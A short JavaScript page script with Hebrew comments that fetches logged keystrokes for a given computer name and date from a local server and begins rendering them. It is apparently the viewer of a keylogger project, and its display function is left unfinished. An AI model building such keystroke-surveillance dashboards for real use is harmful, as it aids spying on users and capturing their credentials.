// פונקציה לקריאת הפרמטר מה-URL
const getQueryParam = (param) => {
    const urlParams = new URLSearchParams(window.location.search);
    console.log(urlParams);
    return urlParams.get(param);
};

// קריאת הפרמטרים
const computer = getQueryParam("name");
const date = getQueryParam("date");


// כתובת השרת
const url = 'http://127.0.0.1:5000'

// פונקציה להצגת הנתונים בדף    
const displayData = (data) => {
    // יצירת קונטיינר ראשי לכל הנתונים
    const container = document.createElement('div');
    container.classList.add("container");

    // יצירת כותרת
    const title = document.createElement('h1');
    title.innerText = `Data for ${computer} on ${date}`;
    container.appendChild(title);

    // יצירת טבלה
    const table = document.createElement('table');
    table.classList.add("data-table");

    }

// פונקציה לקבלת מידע מהשרת
async function fetchData() {
    console.log("Fetching data..."); // הדפסת הודעה לקונסול
    console.log(`${url}/api/get_keystrokes_by_name_and_date/${encodeURIComponent(computer)}/${date}`);
    try {
        const response = await fetch(`${url}/api/get_keystrokes_by_name_and_date/${encodeURIComponent(computer)}/${date}`); // בקשה לשרת
        if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
        const data = await response.json(); // המרת התגובה לאובייקט JSON
        displayData(data); // הצגת הנתונים בדף
    } catch (error) {
        console.error("Error fetching data:", error);
    }
}
fetchData(); // קריאה לפונקציה לקבלת הנתונים מהשרת
